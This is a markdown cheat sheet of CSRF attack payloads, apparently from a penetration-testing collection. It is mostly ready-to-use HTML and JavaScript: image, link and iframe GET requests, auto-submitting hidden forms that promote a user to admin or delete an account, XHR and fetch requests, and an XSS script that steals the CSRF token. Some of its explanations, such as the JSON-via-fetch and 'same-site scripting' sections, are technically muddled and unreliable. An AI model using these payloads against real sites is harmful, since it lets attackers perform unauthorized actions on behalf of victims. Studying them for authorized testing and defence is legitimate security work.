# CSRF (Cross-Site Request Forgery) Payload Cheat Sheet

This cheat sheet contains a list of payloads and methods to test for CSRF vulnerabilities. CSRF vulnerabilities occur when unauthorized commands are executed on behalf of authenticated users. **Note:** These payloads are strictly for educational and authorized testing purposes only.

---

## Contents

- [Basic CSRF Payloads](#basic-csrf-payloads)
- [GET Request CSRF Payloads](#get-request-csrf-payloads)
- [POST Request CSRF Payloads](#post-request-csrf-payloads)
- [CSRF with HTML Forms](#csrf-with-html-forms)
- [JavaScript-Based CSRF Payloads](#javascript-based-csrf-payloads)
- [Bypassing CSRF Protections](#bypassing-csrf-protections)
- [Advanced CSRF Techniques](#advanced-csrf-techniques)

---

## Basic CSRF Payloads

A basic CSRF attack involves forcing a victim's browser to execute an unwanted request. This can be as simple as embedding a link that the victim clicks while authenticated.

```html
<img src="http://target.com/vulnerable-endpoint?param=value">
```

---

## GET Request CSRF Payloads

GET-based CSRF attacks often use images, iframes, or links to trick users into triggering actions with a simple click.

### Image-Based CSRF

An `<img>` tag can be used to send an unauthorized GET request.

```html
<img src="http://target.com/vulnerable-endpoint?action=delete&user=123">
```

### Link-Based CSRF

A clickable link, if accessed by the target user, will execute the unwanted action.

```html
<a href="http://target.com/vulnerable-endpoint?action=update&status=enabled">Click here</a>
```

### Iframe-Based CSRF

Using an iframe, you can execute the request as soon as the page loads.

```html
<iframe src="http://target.com/vulnerable-endpoint?action=modify&user=456"></iframe>
```

---

## POST Request CSRF Payloads

POST requests generally require an HTML form submission to exploit, as some parameters must be submitted via HTTP POST.

### Auto-Submitting Form

The following form will automatically submit on page load, executing the POST request without user interaction.

```html
<form action="http://target.com/vulnerable-endpoint" method="POST">
    <input type="hidden" name="username" value="victim">
    <input type="hidden" name="role" value="admin">
    <input type="hidden" name="action" value="promote">
    <input type="submit" value="Submit">
</form>

<script>
    document.forms[0].submit();
</script>
```

---

## CSRF with HTML Forms

Using hidden HTML forms can effectively execute CSRF attacks by embedding malicious requests.

### Hidden Form with Auto-Submission

The form contains hidden fields, automatically sending sensitive parameters to the vulnerable endpoint.

```html
<form action="http://target.com/account/delete" method="POST">
    <input type="hidden" name="user_id" value="12345">
    <input type="hidden" name="confirm" value="yes">
</form>

<script>
    document.forms[0].submit();
</script>
```

### Clickable Button Form

If automatic submission is not feasible, you can make the user click a button.

```html
<form action="http://target.com/account/update" method="POST">
    <input type="hidden" name="status" value="active">
    <input type="submit" value="Click here to activate">
</form>
```

---

## JavaScript-Based CSRF Payloads

JavaScript can be used to make CSRF requests in environments where it is allowed. Be aware that Content Security Policy (CSP) or Same-Origin Policy (SOP) may prevent JavaScript-based CSRF.

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://target.com/vulnerable-endpoint", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("param1=value1&param2=value2");
</script>
```

---

## Bypassing CSRF Protections

Many modern applications use tokens and other mechanisms to mitigate CSRF attacks. Here are some techniques for bypassing CSRF protections:

### Referer Header Spoofing

If the application only checks for the presence of a `Referer` header, some insecure browser configurations may allow spoofing the header.

### Cookie Reuse

For applications relying solely on cookies without CSRF tokens, an attacker can trigger requests directly, as the browser will send stored cookies.

### Using XSS to Bypass CSRF Protections

If an XSS vulnerability is present, you can extract CSRF tokens dynamically and perform the CSRF attack via JavaScript.

```javascript
<script>
    // Assuming token can be accessed via JavaScript
    var csrfToken = document.getElementsByName("csrf_token")[0].value;

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://target.com/vulnerable-endpoint", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("param=value&csrf_token=" + csrfToken);
</script>
```

---

## Advanced CSRF Techniques

Advanced CSRF attacks use more sophisticated techniques to bypass protections or achieve specific objectives.

### JSON CSRF

Some endpoints accept JSON data, which can complicate CSRF execution. However, JSON CSRF can sometimes be achieved through misconfigured CORS (Cross-Origin Resource Sharing).

```html
<script>
    fetch("http://target.com/api/vulnerable-endpoint", {
        method: "POST",
        body: JSON.stringify({ "action": "delete", "user_id": "123" }),
        headers: { "Content-Type": "application/json" }
    });
</script>
```

### Same-Site Scripting CSRF

If an attacker can embed a page within the target website (e.g., in an iframe), they can use it to send cross-origin requests, bypassing CSRF protections.

```html
<iframe src="http://target.com/vulnerable-page" style="display:none;"></iframe>
```

### Using `window.open` and `postMessage`

If the application allows cross-origin communication with `postMessage`, it may be possible to control actions through an opened window.

```html
<script>
    var win = window.open("http://target.com/vulnerable-page");
    win.postMessage("csrf_payload", "*");
</script>
```

---

## Additional Notes

- **Anti-CSRF Tokens**: Many modern applications use anti-CSRF tokens, which are unique tokens that must be present in each request. Applications not properly validating these tokens may still be vulnerable.
- **SameSite Cookies**: Setting cookies with the `SameSite` attribute restricts cookies from being sent with cross-site requests. This reduces CSRF risks, but insecure or legacy configurations may still allow CSRF.

---

### License

This cheat sheet is open-sourced and can be used for ethical testing and research. Unauthorized or illegal testing is prohibited.

---
